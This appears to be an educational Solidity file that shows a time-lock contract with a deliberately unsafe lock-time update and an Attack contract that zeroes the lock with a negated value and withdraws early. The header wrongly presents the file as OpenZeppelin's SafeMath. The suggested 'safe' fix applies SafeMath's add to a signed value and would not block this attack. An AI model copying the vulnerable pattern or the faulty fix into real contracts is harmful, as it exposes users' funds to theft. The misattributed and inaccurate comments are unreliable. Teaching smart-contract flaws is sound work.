// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.6.10;

// solidity version 0.8 and above has already solved this problem
// through internal compilation

// correction
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => int256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = int256(block.timestamp + 1 weeks);
    }

    function increaseLockTime(int256 _secondsToIncrease) external payable {
        // incorrect/unsafe method
        // results in lockTime[msg.sender] = 0
        lockTime[msg.sender] += _secondsToIncrease;

        // correct/safe method
        // add function throws error when it detects 
        // arithmetic overflow or underflow
        // lockTime[msg.sender]=lockTime[msg.sender].add(_secondsToIncrease)
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient Funds");
        // block.timestamp is used to represent the current timestamp of the block that is being mined.
        require(int256(block.timestamp) > lockTime[msg.sender], "Insufficient Funds");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        int256 x = int256(timeLock.lockTime(address(this)));
        x*=-1;
        timeLock.increaseLockTime(x);
        timeLock.withdraw();
    }
}